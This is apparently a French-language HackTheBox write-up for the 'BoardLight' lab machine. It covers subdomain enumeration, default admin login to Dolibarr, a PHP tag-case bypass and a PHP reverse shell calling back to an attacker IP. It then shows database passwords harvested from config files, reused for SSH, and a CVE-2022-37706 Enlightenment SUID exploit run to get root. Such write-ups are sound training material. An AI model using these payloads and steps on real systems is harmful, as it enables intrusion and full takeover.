---
title: HTB | BoardLight
description: BoardLight is an easy difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data. After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell.
slug: boardlight-htb
date: 2024-08-04 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="BoardLight cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">BoardLight</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.11</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
larissa : serverfun2$2023!!
```

## Enumeration

### nmap
Port 80 et 443 (http et https) ouverts.

## Foothold

### board.htb -> crm.board.htb
Subdomain attack :
```bash
gobuster dns -d board.htb -t 50 -w /usr/share/wordlists/dnsmap.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     board.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dnsmap.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: crm.board.htb
```

### Login page (crm.board.htb)
On a acces a une page de login.
User : admin
mdp : admin

### Dashboard - RCE
Sur le dashboard **Dolibarr** on peut créer un site internet. On peut modifier le code html et y mettre du code php.
Il faut pour cela modifier la balise car nous n'avons pas la permission pour mettre du php:
```php
<?phP echo "haa"; ?>
```
Code php reverse shell.
```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.48';  // CHANGE THIS
$port = 6789;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Il suffit ensuite de mettre notre reverse shell php dans la page puis de l'ouvrir.
Sur notre terminal, on se met en attente avec un : `nc -lnvp 6789`

### User flag
En regardant dans les fichiers de configuration du serveur web, on trouve un mot de passe : `serverfun2$2023!!`
Dans /home, on a observé l'utilisateur `larissa` précédemment. On suppose qu'il s'agit de son mot de passe et ça marche !
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat * | grep pass
...
$dolibarr_main_db_pass='serverfun2$2023!!';
...
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
Password: 
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cat ~/user.txt 
6e47.....36af
^C
$ ssh larissa@10.10.11.11 
Password: serverfun2$2023!!
```

## Privilege Escalation

### Enumeration : LinPEAS
Execution d'un nouveau linpeas depuis le compte de larissa. On trouve des binaires qui semblent SUID vulnerable.
```bash
══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

### CVE-2022–37706 : SUID binary
Enlightenment v0.25.3 - Privilege escalation

https://www.exploit-db.com/exploits/51180

En executant le fichier `exploit.sh` trouvé sur github, on obtient directement un accès root. Cette faille permet de trouver un binaire SUID Vulnérable sur la machine, puis de s'en servir pour obtenir un shell en tant que root.

```bash
$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
## whoami
root
## cat /root/root.txt
2de2.....893c
```